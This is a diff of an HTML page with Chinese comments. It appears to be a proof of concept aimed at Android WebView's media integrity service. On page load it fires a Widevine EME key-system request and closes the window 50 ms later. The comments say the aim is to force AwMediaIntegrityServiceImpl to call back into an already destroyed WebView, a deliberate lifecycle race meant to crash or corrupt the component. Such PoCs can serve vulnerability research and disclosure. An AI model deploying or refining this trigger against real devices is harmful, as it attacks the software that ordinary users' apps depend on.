@@ -2,21 +2,32 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>正在触发压测...</title>
+    <title>正在隐式触发媒体服务...</title>
 </head>
-<body style="background: #000; color: #fff; text-align: center; padding-top: 50px;">
-    <h3>正在向底层发送高危请求并强行关闭...</h3>
+<body style="background: #111; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
+    <h3>正在唤醒底层媒体完整性服务...</h3>
+    <p>正在通过标准 EME 接口发送安全证书请求</p>
 
     <script>
         window.onload = function() {
-            if (navigator.getWebViewMediaIntegrityTokenProvider) {
-                try {
-                    // 1. 成功向 Java 层投递异步请求
-                    navigator.getWebViewMediaIntegrityTokenProvider({ cloudProjectNumber: 12345678 });
-                } catch(e) {}
+            // 1. 调用标准的加密媒体扩展接口（EME）
+            // 这会强制 WebView 的 Android 底层媒体栈去寻找并唤醒 AwMediaIntegrityService
+            if (navigator.requestMediaKeySystemAccess) {
+                navigator.requestMediaKeySystemAccess('com.widevine.alpha', [{
+                    initDataTypes: ['cenc'],
+                    videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }]
+                }]).then(function(keySystemAccess) {
+                    console.log("DRM 栈唤醒成功");
+                }).catch(function(e) {
+                    // 我们不需要它真的成功，只要请求发出去了，底层 Java 就会执行
+                    console.log("DRM 请求已送达底层");
+                });
+            } else {
+                console.log("不支持 EME");
             }
 
-            // 2. 延迟 50 毫秒再自杀，确保 Java 层收到请求的一瞬间 WebView 刚好被销毁
+            // 2. 关键：趁底层还在处理 DRM 证书和环境校验的异步空档，立刻自杀！
+            // 逼迫 AwMediaIntegrityServiceImpl 在回调时面临 WebView 已经被 destroy 的局面
             setTimeout(function() {
                 window.close();
             }, 50); 
